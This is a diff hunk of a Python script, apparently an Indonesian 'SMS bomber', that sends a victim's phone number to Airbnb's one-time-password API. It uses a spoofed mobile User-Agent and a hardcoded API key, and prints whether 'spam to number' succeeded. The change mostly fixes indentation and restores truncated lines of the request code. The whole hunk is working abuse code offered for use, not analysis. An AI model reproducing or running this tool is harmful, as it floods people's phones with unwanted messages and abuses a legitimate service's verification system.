@@ -71,18 +71,18 @@ def main():
                                 }
 
                                 Cookies = Cookie('.cookieslog','w')
-                                Sess = requests.Session()
-                                Sess.cookies = Cookies
-                                Sess.headers = {'User-Agent' : 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0;                        >
-
-                                send = Sess.post('https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=U                       >
-
-                                if 'error' in send.text:
-                                        print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(phone)+W+' GAGAL'+M+' \xE2                       >
-
-                                else:
-                                        print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(phone)+W+' BERHASIL'+H+' \                       >
-                                        Cookies.save()
+				Sess = requests.Session()
+				Sess.cookies = Cookies
+				Sess.headers = {'User-Agent' : 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; 909) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537'}
+				
+				send = Sess.post('https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id', json = data)
+			
+				if 'error' in send.text:
+					print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(phone)+W+' GAGAL'+M+' \xE2\x9C\x96')
+				
+				else:
+					print(W+'['+C+'*'+W+'] KIRIM SPAM KE NOMOR '+C+str(phone)+W+' BERHASIL'+H+' \xE2\x9C\x94')
+					Cookies.save()
 
                 elif pilih == 'n' or pilih == 'N':
                         print
